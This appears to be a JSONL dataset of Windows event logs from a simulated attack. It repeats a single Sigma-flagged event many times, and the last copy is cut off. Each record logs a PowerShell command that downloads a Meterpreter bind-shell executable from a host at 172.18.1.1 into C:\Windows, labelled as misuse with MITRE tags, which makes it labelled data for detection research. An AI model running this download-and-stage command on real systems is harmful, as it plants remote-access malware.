{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": 